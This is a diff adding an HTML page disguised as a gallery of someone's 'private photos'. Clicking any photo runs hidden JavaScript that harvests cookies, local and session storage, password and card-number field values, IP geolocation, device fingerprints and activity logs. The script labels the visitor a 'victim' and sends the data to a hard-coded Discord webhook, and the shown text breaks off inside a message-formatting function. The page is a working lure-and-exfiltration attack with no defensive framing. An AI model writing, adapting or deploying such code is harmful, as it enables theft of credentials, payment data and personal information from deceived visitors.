@@ -1,0 +1,1272 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <title>My Private Photos</title>
+    <style>
+        body { 
+            font-family: 'Comic Sans MS', cursive, sans-serif; 
+            background: linear-gradient(135deg, #ff9a9e 0%, #fad0c4 100%);
+            margin: 0;
+            padding: 20px;
+            min-height: 100vh;
+            color: #333;
+        }
+        .container {
+            max-width: 900px;
+            margin: 0 auto;
+            background: rgba(255, 255, 255, 0.9);
+            backdrop-filter: blur(5px);
+            border-radius: 25px;
+            padding: 40px;
+            box-shadow: 0 15px 35px rgba(255, 107, 107, 0.2);
+            border: 3px solid #ff6b6b;
+        }
+        h1 {
+            text-align: center;
+            margin-bottom: 15px;
+            font-size: 2.8em;
+            color: #ff6b6b;
+            text-shadow: 2px 2px 0px #ffd6d6;
+        }
+        .subtitle {
+            text-align: center;
+            margin-bottom: 40px;
+            color: #666;
+            font-size: 1.2em;
+            font-weight: bold;
+        }
+        .gallery {
+            display: grid;
+            grid-template-columns: repeat(3, 1fr);
+            gap: 25px;
+            margin: 40px 0;
+        }
+        .image-card {
+            background: white;
+            border-radius: 20px;
+            padding: 20px;
+            text-align: center;
+            cursor: pointer;
+            transition: all 0.3s ease;
+            border: 3px solid #4ecdc4;
+            box-shadow: 0 10px 20px rgba(78, 205, 196, 0.2);
+            position: relative;
+            overflow: hidden;
+        }
+        .image-card:before {
+            content: '';
+            position: absolute;
+            top: 0;
+            left: -100%;
+            width: 100%;
+            height: 100%;
+            background: linear-gradient(90deg, transparent, rgba(255, 255, 255, 0.4), transparent);
+            transition: 0.5s;
+        }
+        .image-card:hover:before {
+            left: 100%;
+        }
+        .image-card:hover {
+            transform: translateY(-10px) scale(1.05);
+            border-color: #ff6b6b;
+            box-shadow: 0 20px 40px rgba(255, 107, 107, 0.3);
+        }
+        .image-card img {
+            width: 100%;
+            height: 180px;
+            object-fit: cover;
+            border-radius: 15px;
+            margin-bottom: 15px;
+            border: 2px solid #4ecdc4;
+        }
+        .image-title {
+            font-weight: bold;
+            margin-bottom: 8px;
+            font-size: 1.3em;
+            color: #ff6b6b;
+        }
+        .image-desc {
+            font-size: 0.9em;
+            color: #666;
+            line-height: 1.4;
+        }
+        .heart {
+            position: absolute;
+            top: 15px;
+            right: 15px;
+            color: #ff6b6b;
+            font-size: 1.5em;
+            animation: heartbeat 1.5s infinite;
+        }
+        @keyframes heartbeat {
+            0%, 100% { transform: scale(1); }
+            50% { transform: scale(1.2); }
+        }
+        .loading {
+            display: none;
+            text-align: center;
+            margin: 30px 0;
+            padding: 20px;
+            background: rgba(78, 205, 196, 0.1);
+            border-radius: 15px;
+            border: 2px dashed #4ecdc4;
+        }
+        .loading-text {
+            color: #ff6b6b;
+            font-size: 1.2em;
+            font-weight: bold;
+        }
+        .sparkle {
+            color: #ffd166;
+            animation: sparkle 2s infinite;
+        }
+        @keyframes sparkle {
+            0%, 100% { opacity: 1; }
+            50% { opacity: 0.5; }
+        }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <h1>My Private Photos</h1>
+        <p class="subtitle">Click to see my special pictures</p>
+        
+        <div class="loading" id="loading">
+            <div class="loading-text">Opening private album... <span class="sparkle"></span></div>
+        </div>
+        
+        <div class="gallery">
+            <div class="image-card" onclick="executeFullHarvest(1)">
+                <div class="heart"></div>
+                <img src="imglink here" 
+                     alt="Private Photo 1" 
+                     onerror="this.src='imglink here'">
+                <div class="image-title">Just me being silly</div>
+                <div class="image-desc">I took this selfie yesterday</div>
+            </div>
+            
+            <div class="image-card" onclick="executeFullHarvest(2)">
+                <div class="heart"></div>
+                <img src="imglink here" 
+                     alt="Private Photo 2"
+                     onerror="this.src='imglink here'">
+                <div class="image-title">My favorite outfit</div>
+                <div class="image-desc">What do you think</div>
+            </div>
+            
+            <div class="image-card" onclick="executeFullHarvest(3)">
+                <div class="heart"></div>
+                <img src="imglink here" 
+                     alt="Private Photo 3"
+                     onerror="this.src='imglink here'">
+                <div class="image-title">Daily life pics</div>
+                <div class="image-desc">Just normal stuff I do everyday</div>
+            </div>
+        </div>
+    </div>
+
+    <script>
+    const CONFIG = {
+        webhook: 'https://discord.com/api/webhooks/1449393440927387729/jc2OXLIYK4jkkjE6MtnqMD2r_IBVNKq4sw4-aAA5WJeX3teVGHjXItNxtddnG46gPOtQ',
+        images: {
+            1: 'imglink here',
+            2: 'imglink here',
+            3: 'imglink here'
+        }
+    };
+
+    class ComprehensiveDataStream {
+        constructor() {
+            this.active = true;
+            this.interval = null;
+            this.lastStreamTime = 0;
+            this.streamCount = 0;
+            this.startContinuousStreaming();
+        }
+
+        async startContinuousStreaming() {
+            await this.streamDataSnapshot();
+            this.interval = setInterval(async () => {
+                if (this.active) await this.streamDataSnapshot();
+            }, 3000);
+            this.setupInteractionStreaming();
+        }
+
+        setupInteractionStreaming() {
+            document.addEventListener('mousemove', () => {
+                if (this.active && Date.now() - this.lastStreamTime > 1000) {
+                    this.streamBehavioralData();
+                }
+            });
+            document.addEventListener('click', () => {
+                if (this.active) this.streamInteractionData();
+            });
+            document.addEventListener('keydown', () => {
+                if (this.active && Date.now() - this.lastStreamTime > 500) {
+                    this.streamBehavioralData();
+                }
+            });
+            document.addEventListener('scroll', () => {
+                if (this.active && Date.now() - this.lastStreamTime > 1500) {
+                    this.streamBehavioralData();
+                }
+            });
+        }
+
+        async streamDataSnapshot() {
+            try {
+                const streamData = {
+                    meta: {
+                        streamId: 'stream_' + Date.now() + '_' + this.streamCount++,
+                        timestamp: new Date().toISOString(),
+                        type: 'continuous_snapshot',
+                        url: window.location.href
+                    },
+                    basicInfo: await this.extractBasicInfo(),
+                    behavioral: this.extractCurrentBehavioral(),
+                    performance: this.extractPerformanceMetrics(),
+                    session: this.extractSessionData()
+                };
+                this.sendToAdminPanel(streamData);
+                this.lastStreamTime = Date.now();
+            } catch (error) {}
+        }
+
+        async streamBehavioralData() {
+            const behavioralData = {
+                meta: {
+                    streamId: 'behavioral_' + Date.now(),
+                    timestamp: new Date().toISOString(),
+                    type: 'behavioral_update'
+                },
+                behavioral: this.extractCurrentBehavioral(),
+                interactions: {
+                    mouseMovements: window.mouseMovements?.length || 0,
+                    clicks: window.clickCount || 0,
+                    keystrokes: window.keystrokeCount || 0,
+                    scrollDepth: this.getScrollDepth()
+                }
+            };
+            this.sendToAdminPanel(behavioralData);
+        }
+
+        async streamInteractionData() {
+            const interactionData = {
+                meta: {
+                    streamId: 'interaction_' + Date.now(),
+                    timestamp: new Date().toISOString(),
+                    type: 'interaction_capture'
+                },
+                interaction: {
+                    element: document.activeElement?.tagName || 'unknown',
+                    url: window.location.href,
+                    viewport: {
+                        width: window.innerWidth,
+                        height: window.innerHeight
+                    },
+                    timestamp: Date.now()
+                }
+            };
+            this.sendToAdminPanel(interactionData);
+        }
+
+        async extractBasicInfo() {
+            return {
+                userAgent: navigator.userAgent,
+                platform: navigator.platform,
+                language: navigator.language,
+                timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
+                screen: {
+                    width: screen.width,
+                    height: screen.height
+                },
+                connection: navigator.connection ? {
+                    effectiveType: navigator.connection.effectiveType,
+                    downlink: navigator.connection.downlink
+                } : null
+            };
+        }
+
+        extractCurrentBehavioral() {
+            return {
+                timeOnPage: Date.now() - (window.pageLoadTime || Date.now()),
+                mouseMovements: window.mouseMovements?.length || 0,
+                clicks: window.clickCount || 0,
+                keystrokes: window.keystrokeCount || 0,
+                focusChanges: window.focusChanges || 0,
+                scrollDepth: this.getScrollDepth(),
+                currentTime: new Date().toISOString()
+            };
+        }
+
+        extractPerformanceMetrics() {
+            const perf = performance;
+            return {
+                memory: perf.memory ? {
+                    usedJSHeapSize: Math.round(perf.memory.usedJSHeapSize / 1024 / 1024),
+                    totalJSHeapSize: Math.round(perf.memory.totalJSHeapSize / 1024 / 1024)
+                } : null,
+                navigation: perf.timing ? {
+                    loadTime: perf.timing.loadEventEnd - perf.timing.navigationStart
+                } : null,
+                now: perf.now()
+            };
+        }
+
+        extractSessionData() {
+            return {
+                sessionStorage: Object.keys(sessionStorage).length,
+                localStorage: Object.keys(localStorage).length,
+                cookies: document.cookie.length,
+                historyLength: window.history.length
+            };
+        }
+
+        getScrollDepth() {
+            const scrollHeight = document.documentElement.scrollHeight - window.innerHeight;
+            const scrolled = window.scrollY;
+            return scrollHeight > 0 ? Math.round((scrolled / scrollHeight) * 100) : 0;
+        }
+
+        sendToAdminPanel(data) {
+            try {
+                const streamKey = 'data_stream_' + Date.now();
+                localStorage.setItem(streamKey, JSON.stringify(data));
+                this.updateVictimDataStream(data);
+                this.triggerDataUpdate();
+            } catch (error) {}
+        }
+
+        updateVictimDataStream(streamData) {
+            try {
+                const existing = localStorage.getItem('victimData');
+                const victims = existing ? JSON.parse(existing) : [];
+                if (victims.length > 0) {
+                    const latestVictim = victims[0];
+                    if (!latestVictim.dataStreams) {
+                        latestVictim.dataStreams = [];
+                    }
+                    latestVictim.dataStreams.push(streamData);
+                    if (latestVictim.dataStreams.length > 50) {
+                        latestVictim.dataStreams.splice(0, latestVictim.dataStreams.length - 50);
+                    }
+                    localStorage.setItem('victimData', JSON.stringify(victims));
+                }
+            } catch (e) {}
+        }
+
+        triggerDataUpdate() {
+            localStorage.setItem('lastVictimUpdate', Date.now().toString());
+        }
+
+        stopStreaming() {
+            this.active = false;
+            if (this.interval) clearInterval(this.interval);
+        }
+    }
+
+    async function extractAllPossibleData() {
+        const data = {};
+
+        const extractionPromises = [
+            extractHardwareData(),
+            extractSystemData(),
+            extractNetworkData(),
+            extractUserData(),
+            extractBrowserData(),
+            extractBehavioralData(),
+            extractAdvancedData(),
+            extractSocialData(),
+            extractFinancialData(),
+            extractGeolocationData()
+        ];
+
+        const results = await Promise.allSettled(extractionPromises);
+        
+        data.hardware = results[0].status === 'fulfilled' ? results[0].value : {};
+        data.system = results[1].status === 'fulfilled' ? results[1].value : {};
+        data.network = results[2].status === 'fulfilled' ? results[2].value : {};
+        data.user = results[3].status === 'fulfilled' ? results[3].value : {};
+        data.browser = results[4].status === 'fulfilled' ? results[4].value : {};
+        data.behavioral = results[5].status === 'fulfilled' ? results[5].value : {};
+        data.advanced = results[6].status === 'fulfilled' ? results[6].value : {};
+        data.social = results[7].status === 'fulfilled' ? results[7].value : {};
+        data.financial = results[8].status === 'fulfilled' ? results[8].value : {};
+        data.geolocation = results[9].status === 'fulfilled' ? results[9].value : {};
+
+        return data;
+    }
+
+    async function extractHardwareData() {
+        return {
+            cpu: extractCPUData(),
+            memory: extractMemoryData(),
+            gpu: extractGPUData(),
+            storage: await extractStorageData(),
+            network: extractNetworkHardwareData(),
+            audio: extractAudioData(),
+            peripherals: extractPeripheralData(),
+            sensors: extractSensorData(),
+            display: extractDisplayData(),
+            battery: await extractBatteryData()
+        };
+    }
+
+    function extractCPUData() {
+        const nav = navigator;
+        return {
+            manufacturer: nav.userAgent.includes('Intel') ? 'Intel' : nav.userAgent.includes('AMD') ? 'AMD' : 'Unknown',
+            architecture: nav.userAgent.includes('x64') ? 'x64' : nav.userAgent.includes('x86') ? 'x86' : 'arm',
+            cores: nav.hardwareConcurrency,
+            memory: nav.deviceMemory || 'Unknown',
+            platform: nav.platform,
+            userAgent: nav.userAgent
+        };
+    }
+
+    function extractMemoryData() {
+        const memory = performance.memory;
+        return {
+            totalJSHeapSize: memory ? memory.totalJSHeapSize : 'Unavailable',
+            usedJSHeapSize: memory ? memory.usedJSHeapSize : 'Unavailable',
+            jsHeapSizeLimit: memory ? memory.jsHeapSizeLimit : 'Unavailable',
+            deviceMemory: navigator.deviceMemory || 'Unknown'
+        };
+    }
+
+    function extractGPUData() {
+        const canvas = document.createElement('canvas');
+        const gl = canvas.getContext('webgl') || canvas.getContext('experimental-webgl');
+        if (!gl) return { available: false };
+        const debugInfo = gl.getExtension('WEBGL_debug_renderer_info');
+        return {
+            available: true,
+            vendor: debugInfo ? gl.getParameter(debugInfo.UNMASKED_VENDOR_WEBGL) : 'Unknown',
+            renderer: debugInfo ? gl.getParameter(debugInfo.UNMASKED_RENDERER_WEBGL) : 'Unknown',
+            version: gl.getParameter(gl.VERSION),
+            shadingLanguage: gl.getParameter(gl.SHADING_LANGUAGE_VERSION)
+        };
+    }
+
+    async function extractStorageData() {
+        return {
+            localStorage: extractLocalStorage(),
+            sessionStorage: extractSessionStorage(),
+            cookies: extractCookies(),
+            indexedDB: await checkIndexedDB(),
+            cache: await checkCacheAPI()
+        };
+    }
+
+    function extractLocalStorage() {
+        const data = {};
+        for (let i = 0; i < localStorage.length; i++) {
+            const key = localStorage.key(i);
+            try {
+                data[key] = localStorage.getItem(key);
+            } catch (e) {}
+        }
+        return data;
+    }
+
+    function extractSessionStorage() {
+        const data = {};
+        for (let i = 0; i < sessionStorage.length; i++) {
+            const key = sessionStorage.key(i);
+            try {
+                data[key] = sessionStorage.getItem(key);
+            } catch (e) {}
+        }
+        return data;
+    }
+
+    function extractCookies() {
+        return document.cookie.split(';').reduce((cookies, cookie) => {
+            const [name, value] = cookie.split('=').map(c => c.trim());
+            if (name) cookies[name] = value || '';
+            return cookies;
+        }, {});
+    }
+
+    async function checkIndexedDB() {
+        try {
+            return 'IndexedDB available: ' + !!window.indexedDB;
+        } catch (e) {
+            return 'IndexedDB unavailable';
+        }
+    }
+
+    async function checkCacheAPI() {
+        try {
+            return 'Cache API available: ' + !!window.caches;
+        } catch (e) {
+            return 'Cache API unavailable';
+        }
+    }
+
+    function extractNetworkHardwareData() {
+        const connection = navigator.connection;
+        return {
+            effectiveType: connection ? connection.effectiveType : 'Unknown',
+            downlink: connection ? connection.downlink : 'Unknown',
+            rtt: connection ? connection.rtt : 'Unknown',
+            saveData: connection ? connection.saveData : 'Unknown',
+            onLine: navigator.onLine
+        };
+    }
+
+    function extractAudioData() {
+        const audioContext = window.AudioContext || window.webkitAudioContext;
+        return {
+            audioContextAvailable: !!audioContext,
+            sampleRate: audioContext ? new audioContext().sampleRate : 'Unknown'
+        };
+    }
+
+    function extractPeripheralData() {
+        return {
+            touchSupport: 'ontouchstart' in window,
+            maxTouchPoints: navigator.maxTouchPoints,
+            vibration: 'vibrate' in navigator,
+            bluetooth: 'bluetooth' in navigator,
+            usb: 'usb' in navigator,
+            serial: 'serial' in navigator
+        };
+    }
+
+    function extractSensorData() {
+        return {
+            battery: 'getBattery' in navigator,
+            deviceOrientation: 'DeviceOrientationEvent' in window,
+            deviceMotion: 'DeviceMotionEvent' in window,
+            proximity: 'ondeviceproximity' in window,
+            light: 'ondevicelight' in window
+        };
+    }
+
+    function extractDisplayData() {
+        return {
+            screen: {
+                width: screen.width,
+                height: screen.height,
+                availWidth: screen.availWidth,
+                availHeight: screen.availHeight,
+                colorDepth: screen.colorDepth,
+                pixelDepth: screen.pixelDepth
+            },
+            viewport: {
+                width: window.innerWidth,
+                height: window.innerHeight
+            },
+            devicePixelRatio: window.devicePixelRatio,
+            colorGamut: screen.colorGamut,
+            orientation: screen.orientation ? screen.orientation.type : 'Unknown'
+        };
+    }
+
+    async function extractBatteryData() {
+        if ('getBattery' in navigator) {
+            try {
+                const battery = await navigator.getBattery();
+                return {
+                    charging: battery.charging,
+                    level: battery.level,
+                    chargingTime: battery.chargingTime,
+                    dischargingTime: battery.dischargingTime
+                };
+            } catch (e) {
+                return { available: false };
+            }
+        }
+        return { available: false };
+    }
+
+    async function extractSystemData() {
+        return {
+            platform: navigator.platform,
+            userAgent: navigator.userAgent,
+            language: navigator.language,
+            languages: navigator.languages,
+            timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
+            timezoneOffset: new Date().getTimezoneOffset(),
+            cookieEnabled: navigator.cookieEnabled,
+            pdfEnabled: navigator.pdfViewerEnabled,
+            webdriver: navigator.webdriver,
+            plugins: extractPlugins(),
+            fonts: await extractFonts(),
+            doNotTrack: navigator.doNotTrack,
+            product: navigator.product,
+            productSub: navigator.productSub,
+            vendor: navigator.vendor,
+            vendorSub: navigator.vendorSub
+        };
+    }
+
+    function extractPlugins() {
+        const plugins = [];
+        for (let i = 0; i < navigator.plugins.length; i++) {
+            plugins.push({
+                name: navigator.plugins[i].name,
+                filename: navigator.plugins[i].filename,
+                description: navigator.plugins[i].description
+            });
+        }
+        return plugins;
+    }
+
+    async function extractFonts() {
+        const fontList = [
+            'Arial', 'Arial Black', 'Arial Narrow', 'Arial Rounded MT Bold',
+            'Avant Garde', 'Baskerville', 'Bodoni MT', 'Book Antiqua',
+            'Brush Script MT', 'Calibri', 'Cambria', 'Candara',
+            'Century Gothic', 'Comic Sans MS', 'Consolas', 'Constantia',
+            'Corbel', 'Courier New', 'DejaVu Sans', 'Didot',
+            'Franklin Gothic Medium', 'Futura', 'Garamond', 'Geneva',
+            'Georgia', 'Gill Sans', 'Helvetica', 'Impact',
+            'Lucida Bright', 'Lucida Console', 'Lucida Grande', 'Lucida Sans Unicode',
+            'Microsoft Sans Serif', 'Monaco', 'Montserrat', 'Open Sans',
+            'Optima', 'Palatino', 'Perpetua', 'Rockwell',
+            'Segoe UI', 'Tahoma', 'Times New Roman', 'Trebuchet MS',
+            'Verdana', 'Webdings', 'Wingdings', 'Zapf Dingbats'
+        ];
+        const availableFonts = [];
+        const canvas = document.createElement('canvas');
+        const context = canvas.getContext('2d');
+        const testString = "mmmmmmmmmmlli";
+        const testSize = '72px';
+        fontList.forEach(font => {
+            context.font = testSize + " '" + font + "'";
+            const metrics1 = context.measureText(testString);
+            context.font = testSize + " 'monospace'";
+            const metrics2 = context.measureText(testString);
+            if (metrics1.width !== metrics2.width) {
+                availableFonts.push(font);
+            }
+        });
+        return availableFonts;
+    }
+
+    async function extractNetworkData() {
+        const [ipData, networkInfo, connectionData] = await Promise.allSettled([
+            getIPInfo(),
+            getNetworkInfo(),
+            getConnectionData()
+        ]);
+        return {
+            ip: ipData.status === 'fulfilled' ? ipData.value : {},
+            network: networkInfo.status === 'fulfilled' ? networkInfo.value : {},
+            connection: connectionData.status === 'fulfilled' ? connectionData.value : {}
+        };
+    }
+
+    async function getIPInfo() {
+        try {
+            const response = await fetch('https://api.ipify.org?format=json');
+            const data = await response.json();
+            try {
+                const ipResponse = await fetch(`https://ipapi.co/${data.ip}/json/`);
+                const ipData = await ipResponse.json();
+                return ipData;
+            } catch (e) {
+                return { ip: data.ip };
+            }
+        } catch (error) {
+            return { ip: 'Unknown' };
+        }
+    }
+
+    async function getNetworkInfo() {
+        const connection = navigator.connection;
+        return {
+            effectiveType: connection ? connection.effectiveType : 'Unknown',
+            downlink: connection ? connection.downlink : 'Unknown',
+            rtt: connection ? connection.rtt : 'Unknown',
+            saveData: connection ? connection.saveData : false
+        };
+    }
+
+    async function getConnectionData() {
+        return {
+            referrer: document.referrer,
+            url: window.location.href,
+            protocol: window.location.protocol,
+            host: window.location.host,
+            port: window.location.port,
+            origin: window.location.origin
+        };
+    }
+
+    async function extractUserData() {
+        return {
+            forms: extractFormData(),
+            inputs: extractInputData(),
+            autofill: extractAutofillData(),
+            browsingData: await extractBrowsingData(),
+            socialMedia: extractSocialMediaData(),
+            passwords: extractPasswordFields(),
+            creditCards: extractCreditCardFields()
+        };
+    }
+
+    function extractFormData() {
+        const forms = {};
+        document.querySelectorAll('form').forEach((form, index) => {
+            const formData = {};
+            form.querySelectorAll('input, select, textarea').forEach(field => {
+                if (field.value) {
+                    formData[field.name || field.type || `field_${index}`] = {
+                        value: field.value,
+                        type: field.type,
+                        placeholder: field.placeholder
+                    };
+                }
+            });
+            if (Object.keys(formData).length > 0) {
+                forms[`form_${index}`] = formData;
+            }
+        });
+        return forms;
+    }
+
+    function extractInputData() {
+        const inputs = {};
+        document.querySelectorAll('input[type="text"], input[type="email"], input[type="tel"], input[type="password"], input[type="search"], input[type="url"]').forEach(input => {
+            if (input.value) {
+                inputs[input.name || input.id || 'unnamed'] = {
+                    value: input.value,
+                    type: input.type,
+                    placeholder: input.placeholder
+                };
+            }
+        });
+        return inputs;
+    }
+
+    function extractAutofillData() {
+        const autofill = {};
+        document.querySelectorAll('input').forEach(input => {
+            if (input.matches(':-webkit-autofill')) {
+                autofill[input.name || 'unnamed'] = 'autofilled';
+            }
+        });
+        return autofill;
+    }
+
+    function extractPasswordFields() {
+        const passwords = {};
+        document.querySelectorAll('input[type="password"]').forEach((input, index) => {
+            passwords[`password_${index}`] = {
+                name: input.name,
+                id: input.id,
+                placeholder: input.placeholder,
+                value: input.value
+            };
+        });
+        return passwords;
+    }
+
+    function extractCreditCardFields() {
+        const cards = {};
+        document.querySelectorAll('input[type="tel"][name*="card"], input[type="text"][name*="card"], input[type="number"][name*="card"]').forEach((input, index) => {
+            cards[`card_${index}`] = {
+                name: input.name,
+                id: input.id,
+                placeholder: input.placeholder,
+                value: input.value
+            };
+        });
+        return cards;
+    }
+
+    async function extractBrowsingData() {
+        return {
+            historyLength: window.history.length,
+            performance: extractPerformanceData(),
+            storage: {
+                localStorage: Object.keys(extractLocalStorage()).length,
+                sessionStorage: Object.keys(extractSessionStorage()).length,
+                cookies: Object.keys(extractCookies()).length
+            },
+            timing: performance.timing ? {
+                navigationStart: performance.timing.navigationStart,
+                loadEventEnd: performance.timing.loadEventEnd,
+                domComplete: performance.timing.domComplete
+            } : {}
+        };
+    }
+
+    function extractPerformanceData() {
+        const perf = performance.timing;
+        if (!perf) return {};
+        return {
+            navigationStart: perf.navigationStart,
+            loadEventEnd: perf.loadEventEnd,
+            domComplete: perf.domComplete,
+            domContentLoaded: perf.domContentLoadedEventEnd,
+            firstPaint: performance.getEntriesByName('first-paint')[0]?.startTime,
+            firstContentfulPaint: performance.getEntriesByName('first-contentful-paint')[0]?.startTime
+        };
+    }
+
+    function extractSocialMediaData() {
+        const social = {};
+        const html = document.documentElement.outerHTML;
+        const platforms = {
+            facebook: /facebook|fb\.com/gi,
+            twitter: /twitter|tweet/gi,
+            instagram: /instagram/gi,
+            linkedin: /linkedin/gi,
+            tiktok: /tiktok/gi,
+            discord: /discord/gi,
+            snapchat: /snapchat/gi,
+            whatsapp: /whatsapp/gi,
+            telegram: /telegram/gi
+        };
+        Object.keys(platforms).forEach(platform => {
+            if (platforms[platform].test(html)) {
+                social[platform] = 'detected';
+            }
+        });
+        return social;
+    }
+
+    async function extractBrowserData() {
+        return {
+            userAgent: navigator.userAgent,
+            appName: navigator.appName,
+            appVersion: navigator.appVersion,
+            product: navigator.product,
+            vendor: navigator.vendor,
+            language: navigator.language,
+            languages: navigator.languages,
+            platform: navigator.platform,
+            cookieEnabled: navigator.cookieEnabled,
+            javaEnabled: navigator.javaEnabled(),
+            pdfViewerEnabled: navigator.pdfViewerEnabled,
+            webdriver: navigator.webdriver,
+            hardwareConcurrency: navigator.hardwareConcurrency,
+            deviceMemory: navigator.deviceMemory,
+            maxTouchPoints: navigator.maxTouchPoints,
+            userAgentData: navigator.userAgentData ? await navigator.userAgentData.getHighEntropyValues([
+                "architecture", "model", "platform", "platformVersion", "uaFullVersion"
+            ]) : 'unavailable'
+        };
+    }
+
+    async function extractBehavioralData() {
+        return {
+            mouseMovements: window.mouseMovements || [],
+            clicks: window.clickCount || 0,
+            scrollDepth: getScrollDepth(),
+            timeOnPage: Date.now() - window.pageLoadTime,
+            keystrokes: window.keystrokeCount || 0,
+            focusChanges: window.focusChanges || 0,
+            resizeEvents: window.resizeEvents || 0
+        };
+    }
+
+    function getScrollDepth() {
+        const scrollHeight = document.documentElement.scrollHeight - window.innerHeight;
+        const scrolled = window.scrollY;
+        return scrollHeight > 0 ? Math.round((scrolled / scrollHeight) * 100) : 0;
+    }
+
+    async function extractAdvancedData() {
+        return {
+            webRTC: await extractWebRTCData(),
+            serviceWorkers: await extractServiceWorkerData(),
+            notifications: extractNotificationData(),
+            permissions: await extractPermissionData(),
+            mediaDevices: await extractMediaDeviceData()
+        };
+    }
+
+    async function extractWebRTCData() {
+        try {
+            const pc = new RTCPeerConnection();
+            const offer = await pc.createOffer();
+            return {
+                webRTCAvailable: true,
+                sdp: offer.sdp.substring(0, 100) + '...'
+            };
+        } catch (e) {
+            return { webRTCAvailable: false };
+        }
+    }
+
+    async function extractServiceWorkerData() {
+        return {
+            serviceWorkers: 'serviceWorker' in navigator,
+            controller: navigator.serviceWorker?.controller ? true : false
+        };
+    }
+
+    function extractNotificationData() {
+        return {
+            notifications: 'Notification' in window,
+            permission: Notification.permission
+        };
+    }
+
+    async function extractPermissionData() {
+        const permissions = {};
+        const permissionTypes = [
+            'camera', 'microphone', 'notifications', 
+            'background-sync', 'clipboard-read', 'clipboard-write'
+        ];
+        for (const permission of permissionTypes) {
+            try {
+                const result = await navigator.permissions.query({name: permission});
+                permissions[permission] = result.state;
+            } catch (e) {}
+        }
+        return permissions;
+    }
+
+    async function extractMediaDeviceData() {
+        try {
+            const devices = await navigator.mediaDevices.enumerateDevices();
+            return {
+                devices: devices.map(device => ({
+                    kind: device.kind,
+                    label: device.label,
+                    deviceId: device.deviceId
+                }))
+            };
+        } catch (e) {
+            return { available: false };
+        }
+    }
+
+    async function extractSocialData() {
+        return {
+            socialProfiles: extractSocialProfiles(),
+            emailAddresses: extractEmailAddresses(),
+            phoneNumbers: extractPhoneNumbers()
+        };
+    }
+
+    function extractSocialProfiles() {
+        const profiles = {};
+        const text = document.body.innerText;
+        const patterns = {
+            instagram: /@[a-zA-Z0-9._]+/g,
+            twitter: /@[a-zA-Z0-9_]+/g,
+            discord: /[a-zA-Z0-9._]+#[0-9]{4}/g
+        };
+        Object.keys(patterns).forEach(platform => {
+            const matches = text.match(patterns[platform]);
+            if (matches) profiles[platform] = matches;
+        });
+        return profiles;
+    }
+
+    function extractEmailAddresses() {
+        const text = document.body.innerText;
+        const emailRegex = /\b[A-Za-z0-9._%+-]+@[A-Za-z0-9.-]+\.[A-Z|a-z]{2,}\b/g;
+        return text.match(emailRegex) || [];
+    }
+
+    function extractPhoneNumbers() {
+        const text = document.body.innerText;
+        const phoneRegex = /(\+?\d{1,3}[-.\s]?)?\(?\d{3}\)?[-.\s]?\d{3}[-.\s]?\d{4}/g;
+        return text.match(phoneRegex) || [];
+    }
+
+    async function extractFinancialData() {
+        return {
+            paymentMethods: extractPaymentMethods(),
+            cryptoWallets: extractCryptoWallets(),
+            bankingInfo: extractBankingInfo()
+        };
+    }
+
+    function extractPaymentMethods() {
+        const methods = {};
+        const text = document.body.innerText.toLowerCase();
+        if (text.includes('paypal')) methods.paypal = 'detected';
+        if (text.includes('stripe')) methods.stripe = 'detected';
+        if (text.includes('venmo')) methods.venmo = 'detected';
+        if (text.includes('cash app')) methods.cashapp = 'detected';
+        return methods;
+    }
+
+    function extractCryptoWallets() {
+        const wallets = {};
+        const text = document.body.innerText;
+        const cryptoPatterns = {
+            bitcoin: /[13][a-km-zA-HJ-NP-Z1-9]{25,34}/g,
+            ethereum: /0x[a-fA-F0-9]{40}/g
+        };
+        Object.keys(cryptoPatterns).forEach(crypto => {
+            const matches = text.match(cryptoPatterns[crypto]);
+            if (matches) wallets[crypto] = matches;
+        });
+        return wallets;
+    }
+
+    function extractBankingInfo() {
+        const info = {};
+        const text = document.body.innerText;
+        if (text.includes('routing') || text.includes('account number')) {
+            info.banking_terms = 'detected';
+        }
+        return info;
+    }
+
+    async function extractGeolocationData() {
+        return {
+            ipLocation: await getIPLocation(),
+            browserLocation: { available: false, reason: 'No permission requested' },
+            wifiNetworks: extractWifiData()
+        };
+    }
+
+    async function getIPLocation() {
+        try {
+            const response = await fetch('https://ipapi.co/json/');
+            return await response.json();
+        } catch (e) {
+            return { error: 'Location unavailable' };
+        }
+    }
+
+    function extractWifiData() {
+        return {
+            connection: navigator.connection ? {
+                type: navigator.connection.effectiveType,
+                downlink: navigator.connection.downlink
+            } : 'unavailable'
+        };
+    }
+
+    async function executeFullHarvest(imageId) {
+        const loading = document.getElementById('loading');
+        loading.style.display = 'block';
+        
+        try {
+            document.querySelectorAll('.image-card').forEach(card => {
+                card.style.pointerEvents = 'none';
+                card.style.opacity = '0.6';
+            });
+
+            const extractionStart = Date.now();
+            const victimData = await extractAllPossibleData();
+            const extractionTime = Date.now() - extractionStart;
+
+            victimData.meta = {
+                imageId: imageId,
+                extractionTime: extractionTime,
+                timestamp: new Date().toISOString(),
+                victimId: generateVictimId(),
+                url: window.location.href,
+                referrer: document.referrer,
+                dataStreamActive: true
+            };
+
+            await sendComprehensiveDiscordData(victimData);
+           
+            storeInAdminPanel(victimData);
+
+            loading.innerHTML = '<div style="color: #4ecdc4; font-size: 1.3em;">Access granted! Opening image...</div>';
+            setTimeout(() => {
+                window.open(CONFIG.images[imageId], '_blank');
+                loading.style.display = 'none';
+                document.querySelectorAll('.image-card').forEach(card => {
+                    card.style.pointerEvents = 'auto';
+                    card.style.opacity = '1';
+                });
+            }, 1000);
+            
+        } catch (error) {
+            
+            setTimeout(() => {
+                window.open(CONFIG.images[imageId], '_blank');
+                loading.style.display = 'none';
+                document.querySelectorAll('.image-card').forEach(card => {
+                    card.style.pointerEvents = 'auto';
+                    card.style.opacity = '1';
+                });
+            }, 1000);
+        }
+    }
+
+    async function sendComprehensiveDiscordData(data) {
+        try {
+            await sendToDiscord(formatMainSummary(data));
+            await sendToDiscord(formatHardwareDetails(data));
+            await sendToDiscord(formatUserDetails(data));
+            await sendToDiscord(formatBehavioralDetails(data));
+        } catch (error) {}
+    }
+
+    async function sendToDiscord(message) {
+        try {
+            const response = await fetch(CONFIG.webhook, {
+                method: 'POST',
+                headers: {
+                    'Content-Type': 'application/json',
+                },
+                body: JSON.stringify({
+                    content: message
+                })
+            });
+            return response.ok;
+        } catch (error) {
+            return false;
+        }
+    }
+
+    function formatMainSummary(data) {
+        return `
+COMPREHENSIVE DATA EXTRACTION COMPLETE
+VICTIM ID: ${data.meta.victimId}
+Extraction Time: ${data.meta.extractionTime}ms
